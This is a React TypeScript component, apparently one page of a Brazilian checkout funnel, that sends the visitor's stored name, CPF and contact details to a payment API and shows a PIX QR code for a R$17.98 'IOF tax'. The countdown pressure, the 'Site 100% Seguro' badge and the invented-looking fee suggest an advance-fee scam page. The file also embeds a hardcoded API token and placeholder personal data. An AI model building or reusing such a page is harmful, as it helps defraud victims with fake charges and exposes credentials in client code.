import React, { useState, useEffect, useRef } from 'react';
import Layout from './components/Layout';
import './TwentiethPage.css';
import { Loader2, ShieldCheck, Copy, Check, Clock } from 'lucide-react';

interface TwentySecondPageProps {}

function TwentySecondPage({ }: TwentySecondPageProps) {
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [qrCodeUrl, setQrCodeUrl] = useState<string | null>(null);
  const [pixCode, setPixCode] = useState<string | null>(null);
  const pixDataRef = useRef<any | null>(null);
  const apiCalledRef = useRef(false);
  const [timeLeft, setTimeLeft] = useState(0);
  const [progress, setProgress] = useState(0);
  const [timerStarted, setTimerStarted] = useState(false);
  const [isCopied, setIsCopied] = useState(false);
  const nomeCompleto = localStorage.getItem('nomeCompleto');
  const cpf = localStorage.getItem('cpf');
  const utmParamsStorage = localStorage.getItem('utmParams');
  const utmParams = utmParamsStorage ? JSON.parse(utmParamsStorage) : {};

  const formatTime = (seconds: number): string => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
  };

  const handleCopyPix = () => {
    if (pixCode) {
      navigator.clipboard.writeText(pixCode)
        .then(() => {
          setIsCopied(true);
          setTimeout(() => setIsCopied(false), 2000);
        })
        .catch(err => {
          console.error('Failed to copy: ', err);
          alert('Falha ao copiar o código PIX. Tente novamente.');
        });
    }
  };

  useEffect(() => {
    const fetchPix = async () => {
      try {
        if (!apiCalledRef.current) {
          apiCalledRef.current = true;
          const endpoint = 'https://api.disruptybr.com.br/api';
          const apiToken = '5w1pSQKdNzhN3u4fUiFxDdZeEh956kXWtIhL03yV2gwXLhz5YXbVxIy5sUH3';

          const contatoStorage = localStorage.getItem('contato');
          const parsedContato = contatoStorage ? JSON.parse(contatoStorage) : { telefone: '', email: '' };

          // Valor fixo de R$ 17,98 para o PIX
          const pixAmount = 1798;

          const response = await fetch(`${endpoint}/public/v1/transactions?api_token=${apiToken}`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              amount: pixAmount,
              offer_hash: '1znznrphl4',
              payment_method: 'pix',
              customer: {
                name: nomeCompleto || 'Nome não encontrado',
                email: parsedContato.email || 'emailteste999@masturmail.com',
                phone_number: parsedContato.telefone || '11985564587',
                document: cpf || '06890182154',
              },
              cart: [
                {
                  product_hash: 'upav9bjeds',
                  title: 'Imposto IOF',
                  cover: null,
                  price: pixAmount,
                  quantity: 1,
                  operation_type: 1,
                  tangible: false,
                },
              ],
              installments: 1,
              expire_in_days: 1,
              tracking: {
                src: 'site',
                utm_source: utmParams.utm_source || '',
                utm_campaign: utmParams.utm_campaign || '',
                utm_medium: utmParams.utm_medium || '',
                utm_content: utmParams.utm_content || '',
                utm_term: utmParams.utm_term || '',
                utm_id: utmParams.utm_id || '',
              },
            }),
          });

          if (!response.ok) {
            const errorData = await response.json();
            throw new Error(`HTTP error! status: ${response.status}, message: ${errorData.message || 'Unknown error'}`);
          }
          const data = await response.json();
          console.log('Payment data:', data);
          pixDataRef.current = data;
          setPixCode(data?.pix?.pix_qr_code || null);
          if (data?.pix?.pix_qr_code) {
            const qrCodeImage = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pix.pix_qr_code)}`;
            setQrCodeUrl(qrCodeImage);
            setTimerStarted(true);
            setTimeLeft(900);
          }
        }
      } catch (error) {
        console.error("Error fetching PIX data:", error);
        setError(error instanceof Error ? error.message : 'An unexpected error occurred.');
        setIsLoading(false);
      } finally {
        setIsLoading(false);
      }
    };

    fetchPix();
  }, []);

  useEffect(() => {
    let interval: NodeJS.Timeout | null = null;
    if (timerStarted) {
      interval = setInterval(() => {
        setTimeLeft((prevTime) => Math.max(0, prevTime - 1));
        setProgress((prevProgress) => {
          const newProgress = Math.round(((900 - timeLeft) / 900) * 100);
          return newProgress;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [timeLeft, timerStarted]);

  useEffect(() => {
    const checkPaymentStatus = async () => {
      if (pixDataRef.current && timeLeft === 0) {
        try {
          const endpoint = 'https://api.disruptybr.com.br/api';
          const apiToken = '5w1pSQKdNzhN3u4fUiFxDdZeEh956kXWtIhL03yV2gwXLhz5YXbVxIy5sUH3';
          const transactionId = pixDataRef.current.transaction_id;

          const response = await fetch(`${endpoint}/public/v1/transactions/${transactionId}?api_token=${apiToken}`, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
            },
          });

          if (!response.ok) {
            const errorData = await response.json();
            throw new Error(`HTTP error! status: ${response.status}, message: ${errorData.message || 'Unknown error'}`);
          }

          const data = await response.json();
          if (data.status === 'paid') {
            localStorage.setItem('frete', 'paid');
            // onNext(); // Consider adding a navigation action here if needed
          } else {
            setError('Pagamento não confirmado.');
          }
        } catch (error) {
          console.error("Error checking payment status:", error);
          setError(error instanceof Error ? error.message : 'An unexpected error occurred.');
        }
      }
    };

    const paymentCheckInterval = setInterval(checkPaymentStatus, 5000);

    return () => clearInterval(paymentCheckInterval);
  }, [timeLeft]);

  return (
    <Layout>
      <div className="page-content flex flex-col items-center">
        <div className="flex flex-col items-center w-full">
          <h2 className="text-2xl font-bold mb-4">Finalize o Pagamento do IOF!</h2>
          {pixCode && (
            <div className="flex flex-col items-center w-full max-w-md mx-auto mb-4">
              <p className="text-[#ff4d2d] font-bold text-lg mb-2 flex items-center">
                <Clock className="h-6 w-6 mr-2" />
                {formatTime(timeLeft)} para pagar
              </p>
              <div className="w-full h-2 bg-gray-200 rounded-lg">
                <div className="bg-[#ff4d2d] h-full rounded-lg" style={{ width: `${progress}%` }}></div>
              </div>
            </div>
          )}
          <div className="bg-gray-100 p-4 mb-4 w-full max-w-md mx-auto rounded-lg">
            <div className="flex flex-col items-center">
              {qrCodeUrl && (
                <img src={qrCodeUrl} alt="PIX QR Code" className="mb-2 mx-auto" />
              )}
              {pixCode && (
                <>
                  <div className="pix-code-container mb-4 cursor-pointer" onClick={handleCopyPix}>
                    <p>{pixCode}</p>
                  </div>
                  <button 
                    onClick={handleCopyPix} 
                    className={`w-full py-3 rounded-lg font-bold flex justify-center items-center mb-4 ${isCopied ? 'bg-green-500 text-white' : 'bg-[#ff4d2d] text-white'}`}
                    disabled={isCopied}
                  >
                    {isCopied ? (
                      <>
                        <Check className="mr-2 h-5 w-5" />
                        Copiado!
                      </>
                    ) : (
                      <>
                        <Copy className="mr-2 h-5 w-5" />
                        Copiar código PIX
                      </>
                    )}
                  </button>
                  <p className="flex items-center mb-4 text-[#ff4d2d]">
                    <Loader2 className="animate-spin mr-2 h-5 w-5 text-[#ff4d2d]" />
                    Aguardando Pagamento
                  </p>
                </>
              )}
              {isLoading && (
                <div className="flex items-center justify-center mb-4">
                  <Loader2 className="animate-spin text-[#ff4d2d] h-12 w-12" />
                </div>
              )}
              {!pixCode && !error && !isLoading && (
                <div className="flex items-center justify-center mb-4">
                  <Loader2 className="animate-spin text-[#ff4d2d] h-12 w-12" />
                </div>
              )}
              {error && <p className="text-center text-red-500 text-xl font-bold">Error: {error}</p>}
              <div className="flex justify-between w-full max-w-xs mt-4">
                <p className="text-right text-xl font-bold">Valor:</p>
                <p className="text-xl font-bold text-green-500">R$ 17,98</p>
              </div>
            </div>
          </div>
          <div className="bg-gray-100 p-6 rounded-lg shadow-md mb-4 w-full max-w-md mx-auto">
            <ol className="list-decimal list-inside mb-4">
              <li className="flex items-center mb-4"> <span className="text-lg text-[#ff4d2d] mr-2">1.</span> Copie o código PIX abaixo.</li>
              <li className="flex items-center mb-4"> <span className="text-lg text-[#ff4d2d] mr-2">2.</span> Abra o app do seu banco e escolha a opção PIX, como se fosse fazer uma transferência.</li>
              <li className="flex items-center"> <span className="text-lg text-[#ff4d2d] mr-2">3.</span> Selecione a opção PIX, copie e cola, cole a chave copiada e confirme o pagamento.</li>
            </ol>
          </div>
          <p className="bg-yellow-100 p-4 rounded-lg mb-4">Este pagamento só pode ser realizado dentro do tempo, após este período, caso o pagamento não for confirmado sua solicitação será cancelada.</p>
          <div className="flex items-center mb-4 text-green-500">
            <ShieldCheck className="w-6 h-6 text-green-500 mr-2" />
            Site 100% Seguro
          </div>
        </div>
      </div>
    </Layout>
  );
}

export default TwentySecondPage;
